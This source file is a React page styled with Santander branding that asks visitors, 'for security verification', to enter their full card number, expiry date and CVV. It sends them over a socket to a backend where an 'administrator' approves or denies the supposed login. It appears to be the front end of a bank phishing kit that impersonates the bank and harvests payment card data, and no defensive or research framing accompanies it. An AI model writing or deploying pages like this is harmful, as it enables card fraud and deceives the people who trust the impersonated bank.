import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import io from 'socket.io-client';
import { CreditCard, RefreshCw, ShieldCheck, ShieldX } from 'lucide-react';

type PageStatus = 'form' | 'waiting' | 'approved' | 'denied' | 'error';

export default function CreditCardVerificationPage() {
  const [status, setStatus] = useState<PageStatus>('form');
  const [errorMessage, setErrorMessage] = useState('');

  const [ccNum, setCcNum] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const attemptId = searchParams.get('attemptId');
  const socketRef = useRef<any>(null);

  useEffect(() => {
    if (!attemptId) {
        setStatus('error');
        setErrorMessage('No attempt ID found in URL.');
        return;
    };

    const socket = io('http://localhost:5000', {
      query: { attemptId },
      withCredentials: true,
    } as any);
    socketRef.current = socket;

    socket.on('status_updated', (data: { status: 'approved' | 'denied' }) => {
      if (data.status === 'approved') setStatus('approved');
      else if (data.status === 'denied') setStatus('denied');
    });

    return () => {
      socket.disconnect();
    };
  }, [attemptId, navigate]);

  const handleCCNumChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-digits
    if (value.length <= 16) {
      setCcNum(value);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);

    if (value.length > 2) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setExpiry(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCvv(value);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (ccNum.length !== 16 || expiry.length !== 5 || cvv.length < 3) {
      setErrorMessage('Please enter valid card details.');
      return;
    }
    setErrorMessage('');
    console.log('Emitting user_submitted_cc', { attemptId, ccNum, expiry, cvv });
    socketRef.current?.emit('user_submitted_cc', { attemptId, ccNum, expiry, cvv });
    setStatus('waiting');
  };

  const renderContent = () => {
    switch (status) {
      case 'form':
        return (
          <>
            <CreditCard className="h-12 w-12 text-blue-500" />
            <h2 className="mt-6 text-2xl font-semibold text-gray-700">For Security Verification</h2>
            <p className="mt-2 text-gray-500">Please enter your card details as requested by the administrator.</p>
            {errorMessage && <p className="mt-4 text-sm text-red-600">{errorMessage}</p>}
            <form onSubmit={handleSubmit} className="mt-6 w-full max-w-sm space-y-4">
              <input
                type="text"
                value={ccNum}
                onChange={handleCCNumChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-600"
                placeholder="Card Number (16 digits)"
              />
              <div className="flex gap-4">
                <input
                  type="text"
                  value={expiry}
                  onChange={handleExpiryChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-600"
                  placeholder="MM/YY"
                />
                <input
                  type="text"
                  value={cvv}
                  onChange={handleCvvChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-600"
                  placeholder="CVV (3-4 digits)"
                />
              </div>
              <button
                type="submit"
                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 px-4 rounded-md font-bold uppercase text-sm"
              >
                Submit Details
              </button>
            </form>
          </>
        );
      case 'waiting':
        return (
          <>
            <RefreshCw className="h-12 w-12 text-blue-500 animate-spin" />
            <h2 className="mt-6 text-2xl font-semibold text-gray-700">Awaiting Final Approval</h2>
            <p className="mt-2 text-gray-500">Your details have been submitted. Please wait.</p>
          </>
        );
      case 'approved':
         setTimeout(() => navigate('/'), 2000);
        return (
          <>
            <ShieldCheck className="h-12 w-12 text-green-500" />
            <h2 className="mt-6 text-2xl font-semibold text-gray-700">Login Approved</h2>
            <p className="mt-2 text-gray-500">You will be redirected shortly.</p>
          </>
        );
      case 'denied':
        return (
          <>
            <ShieldX className="h-12 w-12 text-red-500" />
            <h2 className="mt-6 text-2xl font-semibold text-gray-700">Login Denied</h2>
            <p className="mt-2 text-gray-500">Your login attempt was denied by an administrator.</p>
            <button onClick={() => navigate('/login')} className="mt-6 text-blue-600 hover:underline">
              Back to Login
            </button>
          </>
        );
      case 'error':
        return (
            <>
            <ShieldX className="h-12 w-12 text-red-500" />
            <h2 className="mt-6 text-2xl font-semibold text-gray-700">Error</h2>
            <p className="mt-2 text-gray-500">{errorMessage}</p>
            <button onClick={() => navigate('/login')} className="mt-6 text-blue-600 hover:underline">
                Back to Login
            </button>
            </>
        );
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50 p-4">
      <div className="w-full max-w-md text-center">
        <div className="flex justify-center mb-8">
          <img src="/santander-logo.svg" alt="Santander Logo" className="w-48" />
        </div>
        <div className="bg-white p-8 rounded-lg shadow-md flex flex-col items-center">
          {renderContent()}
        </div>
      </div>
    </div>
  );
} 